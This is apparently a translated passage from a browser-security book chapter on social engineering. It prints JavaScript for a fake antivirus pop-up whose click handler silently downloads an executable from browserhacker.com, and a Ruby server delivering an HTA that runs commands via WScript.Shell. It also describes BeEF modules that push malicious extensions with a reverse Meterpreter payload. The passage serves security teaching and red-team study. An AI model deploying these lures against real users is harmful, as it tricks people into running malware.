
-   [灰色屏幕函数](https://example.org) 用于在屏幕上显示一个黑色的半透明遮罩层。执行 `grayOut(true)` 时，黑色元素会填满整个屏幕，透明度设置为 70%。执行 `grayOut(false)` 时，该元素的 `display` 属性被设置为 `none`，从而隐藏它。

```function grayOut(vis) {
  var dark=document.getElementById('darkenScreenObject');
  if (!dark) {
    var tbody = document.getElementsByTagName("body")[0];
    var tnode = document.createElement('div');
        tnode.style.position='absolute';
        tnode.style.top='0px';
        tnode.style.left='0px';
        tnode.style.overflow='hidden';
        tnode.style.display='none';
        tnode.id='darkenScreenObject';
    tbody.appendChild(tnode);
    dark=document.getElementById('darkenScreenObject');
  }
  if (vis) {
    var opacity = 70;
    var opaque = (opacity / 100);
    dark.style.opacity=opaque;
    dark.style.MozOpacity=opaque;
    dark.style.filter='alpha(opacity='+opacity+')';
    dark.style.zIndex=100;
    dark.style.backgroundColor='#000';
    dark.style.width='100%';
    dark.style.height='100%';
    dark.style.display='block';
  } else {
     dark.style.display='none';
  }
}
```

-   当执行 `grayOut(true)` 时，会出现一个黑色的半透明遮罩层，遮罩层的透明度为 70%，从而使其看起来像是暗化了背景。执行 `grayOut(false)` 则会把该元素的 `display` 属性恢复为 `none`，使其再次隐藏。

```function avpop() {
  avdiv = document.createElement('div');
  avdiv.setAttribute('id', 'avpop');
  avdiv.setAttribute('style', 'width:754px;height:488px;position:fixed;
    top:50%; left:50%; margin-left: -377px; margin-top: -244px;
    z-index:101');
  avdiv.setAttribute('align', 'center');
  document.body.appendChild(avdiv);
  avdiv.innerHTML= '<br><img id=\'avclicker\'
    src=\'http://browserhacker.com/avalert.png\' />';
}
```

-   执行 `avpop()` 后，会在黑色遮罩层之上弹出一个假冒防病毒的图片对话框。通过为该图片添加点击事件，可以完成攻击循环：

```$j('#avclicker').click(function(e) {

  var div = document.createElement("div");
  div.id = "download";
  div.style.display = "none";
  div.innerHTML=
    "<iframe src='http://browserhacker.com/bad_executable.exe'
    width=1 height=1 style='display:none'></iframe>";
  
  document.body.appendChild(div);

  $j('#avpop').remove();
  grayOut(false);
});
```

-   当点击假冒防病毒图片时，会加载一个不可见的 iframe，从而下载位于 http://browserhacker.com/bad_executable.exe 的可执行文件。随后会移除假冒对话框和黑色遮罩层，使页面恢复到之前的状态。此方法的局限性在于，它仅用于下载可执行文件。

-   与之前提供可执行文件的示例不同，如果针对的浏览器是 Internet Explorer，可以诱导用户运行一个 HTML 应用程序（HTA）。简言之，HTA 将 Internet Explorer 的所有功能封装在不受浏览器严格安全模型和用户界面限制的环境中。例如，在 HTA 中运行的代码会忽略安全区域设置，从而可以轻松访问文件系统、注册表，甚至执行命令。因此，HTA 已被用于恶意活动，最早在 2007 年和 2008 年就出现过。令人惊讶的是，HTA 仍然在最新的 Internet Explorer 中可用，因而仍是有效的攻击向量。

-   下面的代码是一个简单的 Ruby Web 服务器，用于提供一个小型 HTA 应用程序：

```require 'rubygems'
require 'thin'
require 'rack'
require 'sinatra'

class Hta < Sinatra::Base
  before do
    content_type 'application/hta'
  end

  get "/application.hta" do
 "<script>new ActiveXObject('WScript.Shell')" + 
 ".Run('calc.exe')</script>"
  end
end

@routes = {
    "/" => Hta.new
}

@rack_app = Rack::URLMap.new(@routes)
@thin = Thin::Server.new("browserhacker.com", 4000, @rack_app)

Thin::Logging.silent = false
Thin::Logging.debug = true

puts "[#{Time.now}] Thin ready"
@thin.start
```

-   访问 `http://browserhacker.com:4000/application.hta` 将弹出如 [Figure 5-17](#c05.html#figure5-17) 所示的 HTA 警告对话框：

[start figure 

[**Figure 5-17:**](#c05.html#figureanchor5-17) HTA warning

![c05f017.tif](image_fi/662090c05/c05f017.png)

 end figure 

-   如 [Figure 5-17](#c05.html#figure5-17) 所示，对话框看起来像是由 Microsoft 开发的，但实际上并非如此。警告对话框没有任何文件来源的提示，这有助于诱导用户点击“允许”按钮。在此情况下，如果用户允许执行，calc.exe 将会运行。你可以在 browserhacker.com 上查看更高级的攻击示例。

-   为了优化此攻击，自动安装的浏览器扩展可能更为有效，具体取决于情况和目标浏览器。要真正执行负载，需要在目标浏览器中运行以下 JavaScript：

```grayOut(true);
avpop();
```

-   BeEF 包含相同的逻辑，并在其“Fake AV”模块中实现，当执行时，目标会看到类似 [Figure 5-18](#c05.html#figure5-18) 的内容：

[start figure 

[**Figure 5-18:**](#c05.html#figureanchor5-18) Fake AV pop-up

![c05f018.tif](image_fi/662090c05/c05f018.png)

 end figure 

-   BeEF 还有一个“Fake Flash Update”模块，它不再是诱导用户下载可执行文件，而是尝试诱导用户安装恶意浏览器扩展，如 [Figure 5-19](#c05.html#figure5-19)、[Figure 5-20](#c05.html#figure5-20)、[Figure 5-21](#c05.html#figure5-21) 和 [Figure 5-22](#c05.html#figure5-22) 所示。在此情形下，恶意扩展会部署并执行一个反向 Meterpreter 负载。第 7 章专门讨论扩展，因此这里不再详细展开。

[start figure 

[**Figure 5-19:**](#c05.html#figureanchor5-19) Fake Flash dialog box

![c05f019.tif](image_fi/662090c05/c05f019.png)

 end figure 

-   用户点击“安装”按钮后，Firefox 会显示如 [Figure 5-20](#c05.html#figure5-20) 所示的警告对话框。

[start figure 

[**Figure 5-20:**](#c05.html#figureanchor5-20) First Firefox warning

![c05f020.tif](image_fi/662090c05/c05f020.png)

 end figure 

-   警告对话框不止这些。如果用户点击“允许”，则会出现如 [Figure 5-21](#c05.html#figure5-21) 所示的安装确认对话框。

[start figure 

[**Figure 5-21:**](#c05.html#figureanchor5-21) Extension Install dialog box

![c05f021.tif](image_fi/662090c05/c05f021.png)

 end figure 

-   用户点击最终的“Install Now”按钮后，恶意扩展将被安装，随后提示用户重新启动浏览器，如 [Figure 5-22](#c05.html#figure5-22) 所示。

[start figure 

[**Figure 5-22:**](#c05.html#figureanchor5-22) Restart dialog box

![c05f022.tif](image_fi/662090c05/c05f022.png)

 end figure   start feature 

* * *

**Firefox Extension Dropper** BeEF 还提供一个名为“Firefox Extension Dropper”的模块，可用于社交工程和红队评估。恶意扩展会在用户允许安装时立即执行内置的二进制文件。正如 Michael Schierl 原先展示的，安装扩展后重新启动浏览器并非必要，因为使用的是已引导的扩展。由于只针对 Firefox 浏览器，你可能希望启用此模块。这样，一旦浏览器被钩住，用户就会立即被提示安装恶意扩展。

* * *

 end feature 

As you may have guessed from the previous figures, the module selected is targeting the Firefox browser. Not to worry, we haven’t left all you Chrome fans behind. Lucky for you, the module also comes with an optional payload targeting Chrome.

